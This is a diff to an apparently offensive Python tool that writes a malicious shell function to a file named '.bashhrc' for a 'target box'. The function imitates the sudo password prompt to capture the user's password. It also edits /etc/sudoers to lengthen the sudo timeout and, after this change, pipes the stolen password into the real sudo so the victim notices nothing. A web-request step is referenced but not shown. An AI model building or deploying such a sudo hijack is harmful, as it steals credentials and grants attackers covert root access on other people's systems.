@@ -23,7 +23,7 @@ def main():
 
 	#Create sell script to be put on target box
 	if(file == True):
-		print("[*] Output file: .bashhrc")
+		print("[*] Output file: " + filename)
 	if os.path.exists(filename):
 		os.remove(filename)
 	f = open(filename, "x")
@@ -35,6 +35,7 @@ def main():
 	f.write('read -s -p "[sudo] password for $USER: " pw;printf "\\n";\n')
 
 	#Editing sudo timeout
+	#f.write("$origsudo sed -i 's/timestamp_timeout=75//g' /etc/sudoers;\n")
 	f.write("$origsudo sed -i 's/env_reset/env_reset, timestamp_timeout=75/' /etc/sudoers;\n")
 
 	#Creating web request
@@ -47,7 +48,7 @@ def main():
 	#f.write("$origsudo iptables -A OUTPUT -p tcp --dport 22 -j DROP;\n")
 
 	#Executing original command
-	f.write("$origsudo $@;\n")
+	f.write("echo $pw | $origsudo -S $@;\n")
 	
 	#Closing function and file
 	f.write("}\n")
